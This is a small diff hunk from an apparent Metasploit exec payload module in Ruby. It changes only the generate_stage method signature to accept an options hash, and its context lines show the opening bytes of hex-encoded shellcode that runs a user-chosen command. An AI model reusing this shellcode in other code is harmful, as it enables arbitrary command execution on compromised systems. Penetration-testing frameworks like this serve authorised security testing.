@@ -39,7 +39,7 @@ module Metasploit3
   #
   # Dynamically builds the exec payload based on the user's options.
   #
-  def generate_stage
+  def generate_stage(opts={})
     cmd     = datastore['CMD'] || ''
     payload =
       "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68" +
